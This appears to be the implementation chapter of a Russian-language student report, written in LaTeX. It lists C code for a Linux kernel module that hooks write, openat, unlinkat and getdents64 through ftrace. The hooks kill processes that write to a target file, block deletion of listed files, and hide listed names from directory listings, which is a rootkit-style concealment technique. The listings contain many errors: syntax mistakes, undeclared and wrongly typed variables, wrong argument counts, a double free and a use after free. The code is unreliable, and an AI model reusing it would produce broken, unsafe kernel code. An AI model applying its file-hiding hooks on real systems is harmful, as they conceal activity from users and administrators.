\chapter{Технологический раздел}
\label{cha:impl}

\section{Средства и детали реализации}

В качестве языка программирования для реализации поставленной задачи был выбран язык Си. Для сборки модуля использовалась утилита make. В качестве среды разработки был выбран VSCode.

\section{Инициализация модуля}

В листинге \ref{code:init} приведена реализация функции инициализации модуля.

\begin{lstlisting}[label=code:init,caption=Инициализация модуля]
static int fh_init(void)
{
	struct device *fake_device;
	int error = 0,err = 0;
	dev_t devt = 0;
	
	err = start_hook_resources();
	if(err)
		pr_info("Problem in hook functions");
	
	tidy();
	
	error = alloc_chrdev_region(&devt, 0, 1, "usb15");
	
	if (error < 0)
	{
		pr_err("Can't get major number\n");
		return error;
	}
	
	major = MAJOR(devt);
	
	fake_class = class_create(THIS_MODULE, "custom_char_class");
	
	if (IS_ERR(fake_class)) {
		unregister_chrdev_region(MKDEV(major, 0), 1);
		return PTR_ERR(fake_class);
	}
	
	/* Initialize the char device and tie a file_operations to it */
	cdev_init(&fake_cdev, &fake_fops);
	fake_cdev.owner = THIS_MODULE;
	/* Now make the device live for the users to access */
	cdev_add(&fake_cdev, devt, 1);
	
	fake_device = device_create(fake_class,
	NULL,   /* no parent device */
	devt,    /* associated dev_t */
	NULL,   /* no additional data */
	"usb15");  /* device name */
	
	if (IS_ERR(fake_device))
	{
		class_destroy(fake_class);
		unregister_chrdev_region(devt, 1);
		return -1;
	}
	return 0;
}
\end{lstlisting}

\section{Инициализация полей структуры ftrace\_hook}

Инициализация полей структуры ftrace\_hook представлена в листинге~\ref{code:ftracehook2}.

\begin{lstlisting}[label=code:ftracehook2,caption=Инициализация полей структуры ftrace\_hook]
static struct ftrace_hook demo_hooks[] = {
	HOOK("sys_write", fh_sys_write, &real_sys_write),
	HOOK("sys_openat", fh_sys_openat, &real_sys_openat),
	HOOK("sys_unlinkat", fh_sys_unlinkat, &real_sys_unlinkat),
	HOOK("sys_getdents64", fh_sys_getdents64, &real_sys_getdents64)
};
\end{lstlisting}

\section{Реализация функций--оберток}

Реализация функций--оберток представлена в листингах \ref{code:func1}--\ref{code:func4}.

\begin{lstlisting}[label=code:func1,caption=Функция fh\_sys\_write]
static asmlinkage long fh_sys_write(unsigned int fd, const char __user *buf,
size_t count)
{
	long ret;
	struct task_struct *taskd;
	struct kernel_siginfo info;
	int signum = SIGKILL, ret 0;
	task = current;
	
	if (task->pid == target_pid)
	{
		if (fd == target_fd)
		{
			pr_info("write done by process %d to target file.\n", task->pid);
			memset(&info, 0, sizeof(struct kernel_siginfo));
			info.si_signo = signum;
			ret = send_sig_info(signum, &info, task);
			if (ret < 0)
			{
				printk(KERN_INFO "error sending signal\n");
			}
			else
			{
				printk(KERN_INFO "Target has been killed\n");
				return 0;
			}
		}
	}
	
	pr_info("Path debug %s\n", buf);
	char tmp_path=get_filename(buf);
	if (check_fs_blocklist(tmp_path))
	{
		kfree(tmp_path);
		return NULL;
	}
	ret = real_sys_write(fd, buf, count);

	return ret;
}
\end{lstlisting}

\begin{lstlisting}[label=code:func2,caption=Функция fh\_sys\_openat]
static asmlinkage long fh_sys_openat(int dfd, const char __user *filename,
int flags, umode_t mode)
{
	long ret=0;
	char *kernel_filename;
	struct task_struct *task;
	task = current;
	
	kernel_filename = get_filename(filename);
	
	if (check_fs_blocklist(kernel_filename))
	{
		pr_info("our file is opened by process with id: %d\n", task->pid);
		pr_info("blocked opened file : %s\n", filename);
		kfree(kernel_filename);
		ret = real_sys_openat(dfd, filename, flags, mode);
		pr_info("fd returned is %ld\n", ret);
		target_fd = ret;
		target_pid = task->pid;
		ret=0;
		return ret;
	}
	
	kfree(kernel_filename);
	ret = real_sys_openat(filename, flags, mode);
	return ret;
}
\end{lstlisting}

\begin{lstlisting}[label=code:func3,caption=Функция fh\_sys\_unlinkat]
static asmlinkage long fh_sys_unlinkat (int dirfd, const char __user *filename, int flags);
{
	long ret=0;
	char *kernel_filename = get_filename(filename);
	
	if (check_fs_blocklist(kernel_filename))
	{
		kfree(kernel_filename);
		pr_info("blocked to not remove file : %s\n", kernel_filename);
		ret=0;
		kfree(kernel_filename);
		return ret;
	}
	
	kfree(kernel_filename);
	ret = real_sys_unlinkat(dirfd,filename, flags);
	return ret;
}
\end{lstlisting}

\begin{lstlisting}[label=code:func4,caption=Функция fh\_sys\_getdents64]
static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
{
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
	struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
	unsigned long offset = 0;
	int ret = real_sys_getdents64(regs);
	dirent_ker = kzalloc(ret, GFP_KERNEL);
	
	if ( (ret <= 0) || (dirent_ker == NULL) )
		return ret;
	
	long error;
	error = copy_from_user(dirent_ker, dirent, ret);
	
	if(error)
		goto done;
	
	while (offset < ret)
	{
		current_dir = (void *)dirent_ker + offset;
		
		if (check_fs_hidelist(current_dir->d_name))
		{
			if (current_dir == dirent_ker )
			{
				ret -= current_dir->d_reclen;
				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
				continue;
			}
			previous_dir->d_reclen += current_dir->d_reclen;
		}
		else
		{
			previous_dir = current_dir;
		}
		offset += current_dir->d_reclen;
	}
	
	error = copy_to_user(dirent, dirent_ker, ret);
	if(error)
	goto done;
	
done:
	kfree(dirent_ker);
	return ret;
}
\end{lstlisting}



